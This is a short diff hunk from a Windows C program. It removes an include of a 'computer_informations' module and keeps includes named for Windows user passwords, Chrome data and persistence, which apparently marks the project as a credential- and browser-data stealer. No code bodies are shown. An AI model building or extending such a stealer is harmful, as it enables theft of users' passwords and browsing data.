@@ -3,7 +3,6 @@
 #include <windows.h>
 #include <io.h>
 
-#include "computer_informations.c"
 #include "windows_users_passwords.c"
 #include "chrome_data.c"
 #include "persistance.c"
